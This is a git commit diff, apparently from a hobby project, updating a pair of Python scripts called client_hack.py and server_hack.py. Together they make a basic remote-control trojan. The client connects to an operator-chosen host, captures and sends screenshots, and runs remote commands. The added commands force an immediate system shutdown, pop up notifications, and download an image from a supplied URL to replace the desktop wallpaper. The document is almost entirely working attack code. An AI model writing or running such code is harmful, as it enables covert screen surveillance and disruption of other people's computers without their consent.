c9628b97742ad6d37c428f522c0326a8f8cc92c8
shia <161227452+Shia2009@users.noreply.github.com>
2025-07-18 13:49:10 +0300

    Update
    Внесение новых команд и устранение некоторых багов.

--- client_hack.py
+++ client_hack.py
@@ -2,9 +2,39 @@ import socket
 import mss
 import os
 import sys
+import win10toast
+import time
+import ctypes
+import requests
 
 
 port=int(input("Enter the PORT --> "))
+
+def download_image(url, save_path):  # скачивание фото
+    try:
+        response = requests.get(url, stream=True)
+        response.raise_for_status()  # Проверка на ошибки
+
+        with open(save_path, 'wb') as file:
+            for chunk in response.iter_content(1024):
+                file.write(chunk)
+        print(f"Изображение сохранено как {save_path}")
+    except Exception as e:
+        print(f"Ошибка при загрузке: {e}")
+
+
+def change_wallpaper(image_path):  # смена обоев
+    SPI_SET_DESKWALLPAPER = 20
+    SPIF_UPDATEINIFFILE = 0x01
+    SPIF_SENDWININICHANGE = 0x02
+
+    try:
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SET_DESKWALLPAPER, 0, image_path,
+                                                   SPIF_UPDATEINIFFILE | SPIF_SENDWININICHANGE)
+        return True
+    except Exception as e:
+        print(f'Error changing wallpaper: {e}')
+        return False
 
 def send_photo(client_socket):
     with mss.mss() as sct:
@@ -17,7 +47,8 @@ def send_photo(client_socket):
         image_data = file.read(100000000)
 
 def client_program():
-    host = "192.168.56.1"
+    host = input('enter the IP--> ')
+    save_location = "made_by_shia.jpg"  # Имя файла для сохранения
     file_path = os.path.dirname(sys.executable)
 
     try:
@@ -32,6 +63,19 @@ def client_program():
     if message=='photo':
         send_photo(client_socket)
         print(f"photo {file_path} succesful send!")
+    if message=='shutdown':
+        os.system('shutdown -s -t 0')
+    if message=='message':
+        toaster = win10toast.ToastNotifier()
+        toaster.show_toast("made_by_shia", "have a nice day ;)")
+    if message.startswith(("https", "http")):
+        download_image(message, save_location)
+        time.sleep(3)
+        path_wallpaper = rf"{os.getcwd()}\{save_location}"
+        if change_wallpaper(path_wallpaper):
+            print(None)  # если успешно можем вывести что либо
+        else:
+            print(None)  # если не успешн
 
     client_socket.close()
 
--- server_hack.py
+++ server_hack.py
@@ -5,36 +5,43 @@ import os
 
 port=int(input("Enter the PORT --> "))
 
-def server_program():
-    host="192.168.56.1"
-    print(f'Server listen on {host}:{port} \t {datetime.now().strftime("%H:%M:%S")}')
-    server_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind((host, port))
-    listen=int(input("how many sockets to listen to -->"))
-    server_socket.listen(listen)
-    print(f"Server listen to {listen} sockets \t {datetime.now().strftime("%H:%M:%S")}")
-    conn,adr=server_socket.accept()
-    print(f"Get new connection from --> {adr} \t {datetime.now().strftime("%H:%M:%S")}")
+host="192.168.56.1"
+adr_list=[]
+print(f'Server listen on {host}:{port} \t {datetime.now().strftime("%H:%M:%S")}')
+server_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.bind((host, port))
+listen=int(input("how many sockets to listen to -->"))
+server_socket.listen(listen)
+print(f"Server listen to {listen} sockets \t {datetime.now().strftime("%H:%M:%S")}")
+conn, adr = server_socket.accept()
+adr_list.append(adr)
+print(f"Get new connection from --> {adr} \t {datetime.now().strftime("%H:%M:%S")}")
 
-    message=None
-    while message!='finish_server':
+def server_program():
+    print(adr_list)
+    message = input(f"command for {adr} --> ")  # что отправить
+    try:
         adr_send=input('Enter the ADDRESS to whom to send --> ')
         port_send=int(input('Enter the PORT to whom to send --> '))
         target_url=(adr_send, port_send)#кому отправить
-        message = input(f"command for {adr} --> ")#что отправить
         conn.sendto(message.encode(), target_url)#отправляем
+    except Exception as e:
+        print(f"error : [{e}]\t {datetime.now().strftime("%H:%M:%S")}")
+    if message=='photo':
+        try:
+            file = open('server_11.jpg', "wb")
+            image_chunk = conn.recv(100000000)  # stream-based protocol
+            print('Photo saved')
+            while image_chunk:
+                file.write(image_chunk)
+                image_chunk = conn.recv(100000000)
+            file.close()
+            print('file_close')
+        except Exception as e:
+            print(f'ERROR {e}')
 
-        file = open('server_11.jpg', "wb")
-        image_chunk = conn.recv(100000000)  # stream-based protocol
-        print('Photo saved')
-        while image_chunk:
-            file.write(image_chunk)
-            image_chunk = conn.recv(100000000)
-        file.close()
-        print('file_close')
-    else:
-        conn.close()
-    print('123')
 
 if __name__=="__main__":
-    server_program()
+    while True:
+        server_program()
+    conn.close()
